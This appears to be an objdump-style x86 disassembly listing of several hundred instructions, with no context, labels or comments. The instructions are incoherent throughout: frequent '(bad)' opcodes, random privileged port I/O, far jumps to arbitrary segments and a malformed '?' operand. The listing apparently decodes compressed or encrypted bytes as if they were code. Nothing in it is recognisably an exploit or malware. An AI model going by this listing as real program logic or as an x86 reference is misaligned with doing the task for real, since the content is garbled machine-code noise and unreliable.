  41f4dc:	cmp    DWORD PTR [ebp+0xa92301a],ebx
  41f4e2:	mov    BYTE PTR [ecx],ah
  41f4e4:	dec    edi
  41f4e5:	dec    ecx
  41f4e6:	inc    ecx
  41f4e7:	(bad)  
  41f4e8:	xor    BYTE PTR [eax],dh
  41f4ea:	cwde   
  41f4eb:	int    0x77
  41f4ed:	leave  
  41f4ee:	or     ah,cl
  41f4f0:	sub    edx,DWORD PTR [edx]
  41f4f2:	std    
  41f4f3:	and    ah,0x23
  41f4f6:	adc    al,0x7b
  41f4f8:	ss popa 
  41f4fa:	scas   al,BYTE PTR es:[edi]
  41f4fb:	enter  0x9882,0xe3
  41f4ff:	ds in  al,0x48
  41f502:	add    eax,0xc43e259d
  41f507:	xchg   ebx,eax
  41f508:	cs push edx
  41f50a:	clc    
  41f50b:	jbe    0x41f52c
  41f50d:	ins    DWORD PTR es:[edi],dx
  41f50e:	push   esi
  41f50f:	xchg   BYTE PTR [ebx+0x1d],bl
  41f512:	and    cl,ah
  41f514:	sbb    eax,0x1231b908
  41f519:	sbb    edi,esi
  41f51b:	ja     0x41f4d7
  41f51d:	mov    ecx,0x45413c43
  41f522:	mov    fs,WORD PTR [edi+0x5dc0b678]
  41f528:	adc    edi,edi
  41f52a:	mov    dl,0xd3
  41f52c:	dec    eax
  41f52d:	lods   al,BYTE PTR ds:[esi]
  41f52e:	sbb    DWORD PTR [ebx-0x1704ff43],edx
  41f534:	fwait
  41f535:	dec    eax
  41f536:	mov    al,ds:0x170df736
  41f53b:	pop    edi
  41f53c:	hlt    
  41f53d:	ds jle 0x41f54c
  41f540:	imul   esp,DWORD PTR [edx],0xfaeecfdc
  41f546:	fisub  WORD PTR [ecx]
  41f548:	and    cl,BYTE PTR [ebx-0x7d7a1cf]
  41f54e:	mov    al,bh
  41f550:	and    edi,DWORD PTR gs:[edx]
  41f553:	mov    BYTE PTR [edi-0x2],al
  41f556:	add    DWORD PTR [ebx],0x2c
  41f559:	enter  0xe070,0x63
  41f55d:	adc    bh,dh
  41f55f:	mov    DWORD PTR [ebp+edx*2+0x7c080ca2],edi
  41f566:	ds and ecx,DWORD PTR ss:[edx+0x42e6a6f1]
  41f56e:	sbb    al,BYTE PTR [ebx]
  41f570:	ficomp DWORD PTR [esi]
  41f572:	pop    esp
  41f573:	dec    esp
  41f574:	push   ebp
  41f575:	add    esi,DWORD PTR [edx+0x5e]
  41f578:	xchg   edi,eax
  41f579:	cmp    al,0xbf
  41f57b:	retf   0x25
  41f57e:	(bad)  
  41f57f:	xchg   esi,eax
  41f580:	inc    ecx
  41f581:	jae    0x41f5f7
  41f583:	cmp    al,0x2b
  41f585:	scas   al,BYTE PTR es:[edi]
  41f586:	gs or  eax,0x85538f14
  41f58c:	push   edi
  41f58d:	cli    
  41f58e:	pop    ebx
  41f58f:	push   ss
  41f590:	pop    ebp
  41f591:	out    dx,eax
  41f592:	cmp    eax,0xb09b7b44
  41f597:	mov    al,ds:0x60ab8cda
  41f59c:	push   0x75
  41f59e:	and    al,0x3f
  41f5a1:	dec    esp
  41f5a2:	enter  0xbeab,0xe7
  41f5a6:	ss test eax,0x3eb6a2ff
  41f5ac:	ds mov esi,ss
  41f5af:	retf   0x15f4
  41f5b2:	retf   0x23c0
  41f5b5:	cmp    DWORD PTR [ecx+0x26],eax
  41f5b8:	inc    esi
  41f5b9:	xor    BYTE PTR [esi],bl
  41f5bb:	mov    DWORD PTR [esp+edx*4+0x3ef12b15],edx
  41f5c2:	adc    bl,dh
  41f5c4:	out    dx,eax
  41f5c5:	inc    edi
  41f5c6:	in     eax,0xdf
  41f5c8:	mov    eax,cs
  41f5ca:	dec    edx
  41f5cb:	repnz cs iret 
  41f5ce:	mov    edi,0xec4a5676
  41f5d3:	push   eax
  41f5d4:	jne    0x41f5e6
  41f5d6:	cld    
  41f5d7:	out    dx,al
  41f5d8:	push   ebx
  41f5d9:	jb     0x41f5e5
  41f5db:	inc    edx
  41f5dc:	fxtract 
  41f5de:	shl    DWORD PTR [ebp+0x1fc3117c],0x8d
  41f5e5:	pop    ds
  41f5e6:	stc    
  41f5e7:	xor    BYTE PTR [ebp+0x59],cl
  41f5ea:	push   0xfffffffb
  41f5ec:	pushf  
  41f5ed:	in     al,dx
  41f5ee:	add    BYTE PTR [ecx+ebx*2],bl
  41f5f1:	pop    edi
  41f5f2:	std    
  41f5f3:	enter  0xd1f7,0xab
  41f5f7:	js     0x41f5eb
  41f5f9:	jo     0x41f635
  41f5fb:	js     0x41f620
  41f5fd:	in     eax,0xf5
  41f5ff:	or     DWORD PTR [eax+0xd79584],esp
  41f605:	xor    eax,0xcc9fdd22
  41f60a:	xchg   ecx,eax
  41f60b:	add    eax,0xc7c16e36
  41f610:	cmc    
  41f611:	xor    edx,DWORD PTR [ecx-0x5c]
  41f614:	mov    al,0xb2
  41f616:	test   ah,ch
  41f618:	push   ss
  41f619:	call   0x1c61696
  41f61e:	mov    ebx,DWORD PTR [edi+eiz*2]
  41f621:	mov    bh,0x57
  41f623:	mov    ebx,0x10b3caee
  41f628:	es jmp 0x41f66b
  41f62b:	pop    ebx
  41f62c:	and    al,0x89
  41f62e:	adc    al,0x29
  41f630:	popf   
  41f631:	cmp    eax,0xea4195a8
  41f636:	sub    cl,0x98
  41f639:	loope  0x41f684
  41f63b:	mov    esp,DWORD PTR [ebp+0x49e811d7]
  41f641:	ds and al,0xdf
  41f644:	jmp    0x41f5fe
  41f646:	xchg   ecx,eax
  41f647:	sub    al,0x74
  41f649:	mov    ss:0x91ffe4b5,eax
  41f64f:	sbb    al,0xa5
  41f651:	pop    edx
  41f652:	push   edi
  41f653:	jmp    0x41f5fe
  41f655:	jbe    0x41f610
  41f657:	dec    ecx
  41f658:	add    bh,BYTE PTR [eax-0x7ab2b984]
  41f65e:	mov    al,0x8b
  41f660:	pop    ebx
  41f661:	dec    BYTE PTR [eax+edx*4-0x5a5b19be]
  41f668:	push   edx
  41f669:	inc    ebx
  41f66a:	add    eax,DWORD PTR [ebp-0x3748dacd]
  41f670:	push   ebp
  41f671:	adc    DWORD PTR [edx+0xab1ff21],ebx
  41f677:	aad    0x95
  41f679:	jp     0x41f6d9
  41f67b:	push   ebx
  41f67c:	mov    eax,ds:0x7d54613a
  41f682:	fstp   DWORD PTR [esi+0x19]
  41f685:	pop    ds
  41f686:	push   0x5753f263
  41f68b:	mov    dh,0x74
  41f68d:	add    al,0xbc
  41f68f:	sbb    esi,DWORD PTR [esi+ebp*2+0x7a]
  41f693:	xchg   ecx,eax
  41f694:	jae    0x41f6ad
  41f696:	jb     0x41f63b
  41f698:	pavgb  mm4,QWORD PTR [ecx+0x20e3956a]
  41f69f:	sub    dh,BYTE PTR [ecx+0x360f1bd4]
  41f6a5:	adc    ebp,DWORD PTR [eax+0x1c1e53df]
  41f6ab:	aam    0x8e
  41f6ad:	aam    0x7
  41f6af:	icebp  
  41f6b0:	adc    al,0xe
  41f6b2:	inc    ebp
  41f6b3:	sar    edx,1
  41f6b5:	mov    ecx,0xbb61ad6a
  41f6ba:	add    al,0x2
  41f6bc:	loop   0x41f6d5
  41f6be:	bound  esp,QWORD PTR ds:0x9b55fbbf
  41f6c4:	adc    al,dh
  41f6c6:	inc    eax
  41f6c7:	jmp    0x8e81:0x9c4df113
  41f6ce:	clc    
  41f6cf:	mov    edx,0x544af7e7
  41f6d4:	cvtdq2ps xmm5,XMMWORD PTR [esi+0x538fbfc8]
  41f6db:	xor    ah,BYTE PTR [ebp-0x615b7ee]
  41f6e1:	adc    eax,DWORD PTR [ecx+ebx*4+0x743794de]
  41f6e8:	jno    0x41f6d0
  41f6ea:	xchg   esi,eax
  41f6eb:	jecxz  0x41f703
  41f6ed:	jp     0x41f690
  41f6ef:	inc    edx
  41f6f0:	lds    esp,FWORD PTR [ebx+0x2dc8a160]
  41f6f6:	mov    esp,0x99df0e68
  41f6fb:	(bad)  
  41f6fd:	sbb    ah,BYTE PTR [esi]
  41f6ff:	mov    ah,0x37
  41f701:	mov    al,0x23
  41f703:	fwait
  41f704:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f706:	add    al,0x5e
  41f708:	mov    ecx,0x689decf
  41f70d:	sahf   
  41f70e:	and    al,0x54
  41f710:	out    0x77,eax
  41f712:	add    DWORD PTR [ebx+0x9],0x34
  41f716:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f717:	cmp    ah,0x5c
  41f71a:	test   al,0x73
  41f71c:	hlt    
  41f71d:	jp     0x41f76e
  41f71f:	stos   BYTE PTR es:[edi],al
  41f720:	out    dx,eax
  41f721:	iret   
  41f722:	pop    ds
  41f723:	imul   ecx,DWORD PTR [ecx-0x4],0x87d37c9b
  41f72a:	xchg   edx,eax
  41f72b:	dec    ecx
  41f72c:	sub    al,0xe0
  41f72e:	nop
  41f72f:	inc    ecx
  41f730:	idiv   BYTE PTR [esi+0x50]
  41f733:	xor    eax,edx
  41f735:	sbb    BYTE PTR [eax-0x55],cl
  41f738:	fwait
  41f739:	and    BYTE PTR [ebp+0x2ba69e28],0x1a
  41f740:	mov    ds:0xf0746212,al
  41f745:	or     ebx,DWORD PTR [ecx-0x460c479c]
  41f74b:	das    
  41f74c:	pop    esp
  41f74d:	jl     0x41f707
  41f74f:	sti    
  41f750:	adc    al,BYTE PTR [esi+0x26]
  41f753:	leave  
  41f754:	pushf  
  41f755:	mov    ?,WORD PTR [esi+0x5aae00ad]
  41f75b:	inc    edi
  41f75c:	and    cl,BYTE PTR [ecx-0x7995f0da]
  41f762:	pop    ecx
  41f763:	aas    
  41f764:	pop    ss
  41f765:	outs   dx,DWORD PTR ds:[esi]
  41f766:	aas    
  41f767:	(bad)  
  41f769:	int    0x91
  41f76b:	mov    edi,DWORD PTR [esi+0x72]
  41f76e:	shl    ecx,1
  41f770:	cmp    eax,0xa56725fd
  41f775:	fdiv   st(7),st
  41f777:	sub    BYTE PTR [ecx-0x7155af36],0x87
  41f77e:	inc    esp
  41f77f:	mov    esp,0x72b41df4
  41f784:	mov    eax,?
  41f786:	and    DWORD PTR [ebx+ebx*2-0x26],edx
  41f78a:	aad    0x74
  41f78c:	mov    esp,0xddc0a953
  41f791:	ror    BYTE PTR [ebx+0x5c],0x2c
  41f795:	stos   BYTE PTR es:[edi],al
  41f796:	cmc    
  41f797:	mov    ebp,0xb00f05a8
  41f79c:	ja     0x41f7de
  41f79e:	das    
  41f79f:	loopne 0x41f788
  41f7a1:	xor    al,0xba
  41f7a3:	and    BYTE PTR [ecx],ch
  41f7a5:	pop    ebp
  41f7a6:	xchg   esp,eax
  41f7a7:	push   es
  41f7a8:	(bad)  
  41f7a9:	push   0xffffffac
  41f7ab:	cli    
  41f7ac:	push   edx
  41f7ad:	mul    DWORD PTR [ebp+0x40]
  41f7b0:	outs   dx,BYTE PTR ds:[esi]
  41f7b1:	jo     0x41f770
  41f7b3:	nop
  41f7b4:	jl     0x41f82b
  41f7b6:	jmp    0x2a5f4194
  41f7bb:	(bad)  
  41f7bc:	fcmovnu st,st(5)
  41f7be:	shl    DWORD PTR [esi-0x2a31a7e0],0xf
  41f7c5:	mov    cl,0xac
  41f7c7:	mov    esp,0xc7857978
  41f7cc:	inc    esi
  41f7cd:	popa   
  41f7ce:	adc    bh,BYTE PTR [edx+0x7e259c3d]
  41f7d4:	and    al,BYTE PTR [edi+edi*2]
  41f7d7:	inc    ecx
  41f7d8:	push   cs
  41f7d9:	aad    0x87
  41f7db:	int3   
  41f7dc:	jne    0x41f77b
  41f7de:	xor    al,0x22
  41f7e0:	enter  0xde5b,0x55
  41f7e4:	jo     0x41f809
  41f7e6:	push   0x1c
  41f7e8:	and    bl,ch
  41f7ea:	add    BYTE PTR [edi+0x52e09f7a],0xe8
  41f7f1:	shl    BYTE PTR [ebx-0x7ac3322d],1
  41f7f7:	das    
  41f7f8:	jbe    0x41f82d
  41f7fa:	ds (bad) 
  41f7fc:	nop
  41f7fd:	adc    ebx,edi
  41f7ff:	pop    esi
  41f800:	stc    
  41f801:	jl     0x41f856
  41f803:	jp     0x41f78c
  41f805:	inc    ecx
  41f806:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f807:	cmp    eax,0x796cfeb3
  41f80c:	cmp    esi,DWORD PTR [ebp-0x77]
  41f80f:	jecxz  0x41f7b2
  41f811:	in     al,dx
  41f812:	and    BYTE PTR [edi+0x64a5846f],bl
  41f818:	mov    esi,0x1db44d29
  41f81d:	(bad)  
  41f81e:	lds    esp,FWORD PTR [ecx-0x35a34b34]
  41f824:	out    dx,eax
  41f825:	jecxz  0x41f7d6
  41f827:	in     eax,0xc0
  41f829:	push   ebx
  41f82a:	or     cl,bl
  41f82c:	jns    0x41f7b0
  41f82e:	sbb    DWORD PTR [edi+ecx*2+0x1ae6a060],eax
  41f835:	bound  eax,QWORD PTR [ebp-0x31]
  41f838:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f839:	or     eax,0xbd79bc02
  41f83e:	xor    al,0x8f
  41f840:	scas   al,BYTE PTR es:[edi]
  41f841:	adc    al,0x9a
  41f843:	xchg   ebp,eax
  41f844:	mov    bl,0x50
  41f846:	xchg   edi,eax
  41f847:	sbb    eax,0xf685adb8
  41f84c:	nop
  41f84d:	fmul   st(2),st
  41f84f:	ds enter 0xd682,0xe1
  41f854:	push   edx
  41f855:	dec    esp
  41f856:	test   eax,0xc3701489
  41f85b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f85c:	mov    eax,ds:0x24823f0c
  41f861:	cwde   
  41f862:	push   edx
  41f863:	cs mov ebx,0x4b7bdbeb
  41f869:	mov    esp,0xab2a0241
  41f86e:	addr16 repnz xchg ebp,eax
  41f871:	pop    ds
  41f872:	mov    cl,0x60
  41f874:	(bad)
  41f877:	jle    0x41f84a
  41f879:	cmc    
  41f87a:	fist   WORD PTR [esi+0x90214d9]
  41f880:	data16 hlt 
  41f882:	pushf  
  41f883:	(bad)  
  41f884:	psubw  mm1,QWORD PTR [edx]
  41f887:	push   ds
  41f888:	cmc    
  41f889:	outs   dx,DWORD PTR ds:[esi]
  41f88a:	jbe    0x41f841
  41f88c:	loope  0x41f8e3
  41f88e:	jns    0x41f869
  41f890:	or     DWORD PTR [esi-0xb],esp
  41f893:	or     al,0xf5
  41f895:	jmp    0x7be:0x6e0c2f1c
  41f89c:	cmp    ebp,DWORD PTR [edx-0x753af879]
  41f8a2:	adc    al,0x36
  41f8a4:	push   ebx
  41f8a5:	push   ebx
  41f8a6:	mov    DWORD PTR [edi+0x6a],edx
  41f8a9:	push   edx
  41f8aa:	pop    ecx
  41f8ab:	enter  0x11,0x2c
  41f8af:	xchg   edi,eax
  41f8b0:	mov    dl,0xc4
  41f8b2:	and    al,0xaa
  41f8b4:	cli    
  41f8b5:	push   ebp
  41f8b6:	stos   DWORD PTR es:[edi],eax
  41f8b7:	cmp    eax,0x8b211a0
  41f8bc:	cmp    bl,BYTE PTR [ebx-0x7e7c30fd]
  41f8c2:	cmc    
  41f8c3:	cwde   
  41f8c4:	pop    ds
  41f8c5:	xchg   esp,eax
  41f8c6:	mov    edi,0x2d914428
  41f8cb:	adc    eax,0x2db3db85
  41f8d0:	ret    
  41f8d1:	mov    fs,WORD PTR [ebx+edx*1-0x3]
  41f8d5:	les    esi,FWORD PTR [edi+eiz*2-0x5714a43b]
  41f8dc:	push   edi
  41f8dd:	pop    esi
  41f8de:	jl     0x41f879
  41f8e0:	in     eax,0x8a
  41f8e2:	xor    al,0xc7
  41f8e4:	xchg   edi,eax
  41f8e5:	int3   
  41f8e6:	call   0x231d:0xa222d2c5
  41f8ed:	mov    cl,0xf
  41f8ef:	jg     0x41f8a2
  41f8f1:	jns    0x41f890
  41f8f3:	call   0x2705:0xaef875d4
  41f8fa:	arpl   WORD PTR [ebx+0x2d71cd03],bx
  41f900:	xlat   BYTE PTR ds:[ebx]
  41f901:	ret    
  41f902:	in     al,0x44
  41f904:	cs mov ah,0x71
  41f907:	sar    BYTE PTR [eax],0xd7
  41f90a:	loop   0x41f97c
  41f90c:	inc    ecx
  41f90d:	or     eax,0xfb4abb2f
  41f912:	cmp    al,0x2a
  41f914:	add    eax,0xd8722579
  41f919:	and    al,0x21
  41f91b:	xchg   ebp,eax
  41f91c:	cwde   
  41f91d:	outs   dx,DWORD PTR ds:[esi]
  41f91e:	pop    ecx
  41f91f:	or     ah,dh
  41f921:	enter  0x51ce,0x5b
  41f925:	and    ebx,ecx
  41f927:	ret    
  41f928:	pop    eax
  41f929:	pop    ds
  41f92a:	dec    esi
  41f92b:	cmp    al,0x6b
  41f92d:	in     eax,0x35
  41f92f:	mov    ss,WORD PTR [eax]
  41f931:	sub    esp,eax
  41f933:	pop    eax
  41f934:	jo     0x41f9b5
  41f936:	sbb    eax,0xdcb52a1c
  41f93b:	xor    eax,0x7e3862d2
  41f940:	xchg   BYTE PTR [ebx-0x1db20442],bh
  41f946:	std    
  41f947:	or     DWORD PTR [eax+0x68fec8de],0xffffffec
  41f94e:	stos   BYTE PTR es:[edi],al
  41f94f:	sbb    DWORD PTR [eax+0x4a],esi
  41f952:	sub    esp,edx
  41f954:	dec    edx
  41f955:	pop    es
  41f956:	or     dl,ah
  41f958:	scas   eax,DWORD PTR es:[edi]
  41f959:	mov    dh,0x79
  41f95b:	sub    DWORD PTR [ebp-0x6c981e6f],eax
  41f961:	aam    0x45
  41f963:	test   bh,ch
  41f965:	sub    al,0xdc
  41f967:	xor    DWORD PTR [ebp+edx*8+0x67d48b38],esp
  41f96e:	in     eax,dx
  41f96f:	mov    al,BYTE PTR [ecx+0x79fd3e3b]
  41f975:	ja     0x41f943
  41f977:	and    al,0xb3
  41f979:	addr16 xchg edi,eax
  41f97b:	pop    ebp
  41f97c:	add    edx,DWORD PTR [ebp-0x6a]
  41f97f:	push   ebp
  41f980:	add    al,BYTE PTR [ebp+0x26e60576]
  41f986:	dec    edx
  41f987:	inc    edi
  41f988:	popa   
  41f989:	sti    
  41f98a:	xchg   ebx,eax
  41f98b:	push   ds
  41f98c:	mov    ds,WORD PTR [esi]
  41f98e:	xchg   esp,eax
  41f98f:	push   esp
  41f990:	stc    
  41f991:	pusha  
  41f992:	mov    BYTE PTR [ecx],ah
  41f994:	sub    al,0x9c
  41f996:	retf   
  41f997:	cmp    cl,BYTE PTR [esi-0x1c20ec86]
  41f99d:	pop    ss
  41f99e:	mov    DWORD PTR [edi-0x1866a25f],esi
  41f9a4:	out    dx,eax
  41f9a5:	popa   
  41f9a6:	jp     0x41fa25
  41f9a8:	int3   
  41f9a9:	cld    
  41f9aa:	sbb    BYTE PTR [edx],dh
  41f9ac:	scas   al,BYTE PTR es:[edi]
  41f9ad:	jp     0x41f9a9
  41f9af:	pop    ss
  41f9b0:	je     0x5e69b789
  41f9b6:	dec    edi
  41f9b7:	jae    0x41f959
  41f9b9:	mov    esp,0xba72a86c
  41f9be:	sub    dh,bl
  41f9c0:	or     BYTE PTR [edi],0x5e
  41f9c3:	mov    bh,0xd
  41f9c5:	mov    cl,0x5d
  41f9c7:	fdivr  st(1),st
  41f9c9:	push   edi
  41f9ca:	cmc    
  41f9cb:	push   esi
  41f9cc:	cmp    cl,ch
  41f9ce:	or     edx,esp
  41f9d0:	mov    dl,0x7a
  41f9d2:	fnstsw WORD PTR [edx]
  41f9d4:	add    dh,BYTE PTR fs:[edx]
  41f9d7:	and    ebx,DWORD PTR [ebx-0x7a3a9b9e]
  41f9dd:	(bad)  
  41f9de:	outs   dx,BYTE PTR ds:[esi]
  41f9df:	jle    0x41fa04
  41f9e1:	daa    
  41f9e2:	fmul   st(7),st
  41f9e4:	out    0xef,al
  41f9e6:	fmul   QWORD PTR [eax]
  41f9e8:	inc    edi
  41f9e9:	leave  
  41f9ea:	out    0x82,eax
  41f9ec:	jg     0x41f9ee
  41f9ee:	pusha  
  41f9ef:	(bad)  
  41f9f0:	cli    
  41f9f1:	(bad)  
  41f9f2:	jno    0x41f9e7
  41f9f4:	mov    edx,ecx
  41f9f6:	xor    al,0x1e
  41f9f8:	call   0x5ab0:0x151ad93c
  41f9ff:	jnp    0x41f9c5
  41fa01:	les    edi,FWORD PTR [eax+0x1295cc65]
  41fa07:	or     bh,BYTE PTR [eax]
  41fa09:	loop   0x41f992
  41fa0b:	outs   dx,BYTE PTR ds:[esi]
  41fa0c:	nop
  41fa0d:	sbb    BYTE PTR [edi],ah
  41fa0f:	stc    
  41fa10:	gs pop esp
  41fa12:	ss pop eax
  41fa14:	sbb    dl,BYTE PTR [edi]
  41fa16:	and    ebp,esp
  41fa18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fa19:	es xchg edi,eax
  41fa1b:	adc    eax,0xa8d579b9
  41fa20:	daa    
  41fa21:	push   cs
  41fa22:	out    dx,eax
  41fa23:	mov    edi,0x1f696ea3
  41fa28:	adc    dh,BYTE PTR [eax+0x46878474]
  41fa2e:	out    0x92,eax
  41fa30:	hlt    
  41fa31:	(bad)  
  41fa32:	xor    dh,BYTE PTR [esi+0x2b]
  41fa35:	aas    
  41fa36:	(bad)  
  41fa37:	pushf  
  41fa38:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fa3a:	or     esi,esp
  41fa3c:	aad    0xe2
  41fa3e:	jecxz  0x41fa81
  41fa40:	pop    edx
  41fa41:	mov    ebx,0x875ddaaa
  41fa46:	adc    edx,DWORD PTR [ebx-0x551954c4]
  41fa4c:	(bad)  {k7}{z}
  41fa51:	in     eax,0x42
  41fa53:	mov    eax,0xbfbfd0d8
  41fa58:	cmp    eax,0x6d3609d5
  41fa5d:	out    dx,al
  41fa5e:	out    dx,al
  41fa5f:	(bad)  
  41fa60:	fisubr WORD PTR [edi]
  41fa62:	into   
  41fa63:	jl     0x41fa0a
  41fa65:	inc    esp
  41fa66:	test   eax,0x1ec8ac9d
  41fa6b:	clc    
  41fa6c:	cmp    ecx,DWORD PTR [edi-0x1d]
  41fa6f:	cmp    eax,0x325b412d
  41fa74:	xor    al,0x44
  41fa76:	adc    al,0x79
  41fa78:	enter  0x915c,0x27
  41fa7c:	sahf   
  41fa7d:	xchg   ebp,eax
  41fa7e:	fistp  DWORD PTR [ebx]
  41fa80:	mul    BYTE PTR [esi+0x69889a26]
  41fa86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fa87:	mov    al,0xaf
  41fa89:	sbb    bl,BYTE PTR [ebx]
  41fa8b:	out    dx,eax
  41fa8c:	int3   
  41fa8d:	mov    esp,DWORD PTR [esi-0x7f]
  41fa90:	dec    esi
  41fa91:	xchg   edx,eax
  41fa92:	jb     0x41fa18
  41fa94:	dec    eax
  41fa95:	fcmovnb st,st(1)
  41fa97:	cmp    bl,dh
  41fa99:	jmp    0x52fe89a1
  41fa9e:	jecxz  0x41fa22
  41faa0:	out    0xe9,eax
  41faa2:	inc    esi
  41faa3:	sub    bl,BYTE PTR [eax+0x45]
  41faa6:	or     ah,bh
  41faa8:	push   ecx
  41faa9:	push   ebx
  41faaa:	adc    eax,edx
  41faac:	imul   ecx,ebp,0x5b
  41faaf:	mov    ebp,DWORD PTR [esi+0x63d7e050]
  41fab5:	inc    eax
  41fab6:	xor    ecx,eax
  41fab8:	(bad)  
  41fab9:	mov    cs,WORD PTR [esi]
  41fabb:	repz mov eax,ds:0x5755a07f
  41fac1:	les    esi,FWORD PTR [ecx-0x32d0ea0b]
  41fac7:	pop    ebx
  41fac8:	stos   DWORD PTR es:[edi],eax
  41fac9:	cwde   
  41faca:	jne    0x41fa57
  41facc:	jne    0x41fa8e
  41face:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41facf:	fld    DWORD PTR [esi+0x14e5ce6a]
  41fad5:	aas    
  41fad6:	mov    edi,0xb13f37ae
  41fadb:	adc    al,0xe9
  41fadd:	lods   eax,DWORD PTR ds:[esi]
  41fade:	cs jle 0x41fb11
  41fae1:	test   DWORD PTR [eax+0x5babc68a],esi
  41fae7:	xlat   BYTE PTR ds:[ebx]
  41fae8:	les    edi,FWORD PTR [esi]
  41faea:	std    
  41faeb:	jle    0x41fb23
  41faed:	iret   
  41faee:	rcr    esp,cl
  41faf0:	inc    edi
  41faf1:	out    0xd,al
  41faf3:	out    dx,eax
  41faf4:	jne    0x41faae
  41faf6:	jp     0x41facc
  41faf8:	ins    BYTE PTR es:[edi],dx
  41faf9:	js     0x41fb09
  41fafb:	sub    ecx,esp
  41fafd:	fist   WORD PTR [ebp-0x43]
  41fb00:	push   edi
  41fb01:	outs   dx,DWORD PTR ds:[esi]
  41fb02:	mov    bl,0xe6
  41fb04:	icebp  
  41fb05:	mov    ds:0xde78a0ad,eax
  41fb0a:	aas    
  41fb0b:	and    edi,DWORD PTR [esi+0x53]
  41fb0e:	sub    al,0xf5
  41fb10:	inc    edi
  41fb11:	mov    ecx,DWORD PTR [edi+0xe]
  41fb14:	(bad)  
  41fb15:	jmp    0x2d815108
  41fb1a:	add    DWORD PTR [esi+0x14e29a08],edx
  41fb20:	xor    dl,BYTE PTR gs:[eax]
  41fb23:	ja     0x41fb6a
  41fb25:	mov    eax,ds:0x8f5942f7
  41fb2a:	bound  esp,QWORD PTR [edi]
  41fb2c:	fcomi  st,st(6)
  41fb2e:	add    eax,0x7e9d3207
  41fb33:	jmp    0x82fbe4ce
  41fb38:	cmp    eax,0x35ed32ca
  41fb3d:	(bad)  
  41fb3e:	dec    edi
  41fb3f:	imul   esp,ebx,0x55f9b60e
  41fb45:	mov    BYTE PTR [esi],ch
  41fb47:	cli    
  41fb48:	push   edi
  41fb49:	test   al,0x51
  41fb4b:	pop    ecx
  41fb4c:	sahf   
  41fb4d:	adc    DWORD PTR [edx+ebx*8],edi
  41fb50:	cmp    BYTE PTR [esi+0x6f],al
  41fb53:	cmp    BYTE PTR [ebx+0x67],bh
  41fb56:	in     al,dx
  41fb57:	fdivr  st(5),st
  41fb59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fb5a:	stc    
  41fb5b:	in     al,0x91
  41fb5d:	sbb    bh,BYTE PTR [edi+0x253e71e5]
  41fb63:	push   cs
  41fb64:	call   0x41a1d4ed
  41fb69:	push   ds
  41fb6a:	jge    0x41fb49
  41fb6c:	hlt    
  41fb6d:	or     DWORD PTR [ecx],ebx
  41fb6f:	lods   al,BYTE PTR ds:[esi]
  41fb70:	jb     0x41fb07
  41fb72:	sub    al,al
  41fb74:	push   0xffffffb8
  41fb76:	lods   eax,DWORD PTR ds:[esi]
  41fb77:	aas    
  41fb78:	outs   dx,BYTE PTR ds:[esi]
  41fb79:	(bad)  
  41fb7a:	jge    0x41fb17
  41fb7c:	sub    DWORD PTR [esi+ebx*4+0x20943b5b],edi
  41fb83:	(bad)  
  41fb84:	xor    dl,BYTE PTR [ecx+0x576d452b]
  41fb8a:	mov    eax,ds:0x90a2072
  41fb8f:	enter  0x56a3,0x3e
  41fb93:	jp     0x41fb8a
  41fb95:	lahf   
  41fb96:	rcl    BYTE PTR [esi-0x2d],1
  41fb99:	test   al,0x2f
  41fb9b:	fdivr  QWORD PTR [ecx+eax*2+0x21]
  41fb9f:	call   DWORD PTR [edx+0x7570de4c]
  41fba5:	call   0x23b5ef41
  41fbaa:	int3   
  41fbab:	or     esp,DWORD PTR [ebx+0x4e]
  41fbae:	daa    
  41fbaf:	lods   eax,DWORD PTR ds:[esi]
  41fbb0:	adc    eax,0x1ca93bbb
  41fbb5:	push   ebp
  41fbb6:	adc    ah,BYTE PTR [ebp-0x2cd76090]
  41fbbc:	hlt    
  41fbbd:	mov    BYTE PTR [ebx-0x6cf27952],al
  41fbc3:	stc    
  41fbc4:	pusha  
  41fbc5:	mov    esi,DWORD PTR [edi]
  41fbc7:	retf   
  41fbc8:	inc    ebx
  41fbc9:	(bad)  
  41fbca:	xchg   esi,eax
  41fbcb:	sub    dl,BYTE PTR [ebx-0x70]
  41fbce:	outs   dx,DWORD PTR ds:[esi]
  41fbcf:	push   cs
  41fbd0:	inc    ebp
  41fbd1:	add    eax,0x13bcc576
  41fbd6:	add    al,0x37
  41fbd8:	xor    eax,DWORD PTR [ebp+0x6aa13acf]
  41fbde:	push   0xffffffd0
  41fbe0:	inc    ebx
  41fbe1:	sub    eax,0x1b533a2e
  41fbe6:	ret    0x9d9
  41fbe9:	les    esi,FWORD PTR [ecx-0x8]
  41fbec:	adc    bh,BYTE PTR [eax-0x30]
  41fbef:	mov    ebx,0x3c8dbcbd
  41fbf4:	arpl   bp,cx
  41fbf6:	mov    cs,WORD PTR [ebp+ecx*2-0x6b09bcb5]
  41fbfd:	mov    dl,0xdb
  41fbff:	je     0x41fc59
  41fc01:	loop   0x41fbc0
  41fc03:	add    ch,BYTE PTR [ebx+eiz*8-0x3e]
  41fc07:	iret   
  41fc08:	mov    cl,BYTE PTR [edi-0x5f30a888]
  41fc0e:	arpl   cx,cx
  41fc10:	push   0xffffffa5
  41fc12:	mov    bl,0x70
  41fc14:	test   BYTE PTR [ecx-0x6820957c],cl
  41fc1a:	call   0xbc46:0xef6892ac
  41fc21:	bsf    esp,DWORD PTR ds:0x85df653b
  41fc28:	test   DWORD PTR [edi-0x1c4e11e5],esp
  41fc2e:	fst    DWORD PTR [edx+0x11]
  41fc31:	dec    ebx
  41fc32:	fist   WORD PTR [esi]
  41fc34:	push   0x2b
  41fc36:	fimul  DWORD PTR [eax-0x71efa397]
  41fc3c:	jae    0x41fc6d
  41fc3e:	pop    ebp
  41fc3f:	push   esi
  41fc40:	inc    edi
  41fc41:	add    ch,dh
  41fc43:	int3   
  41fc44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fc45:	push   esp
  41fc46:	mov    ebx,0x8adc4d4e
  41fc4b:	std    
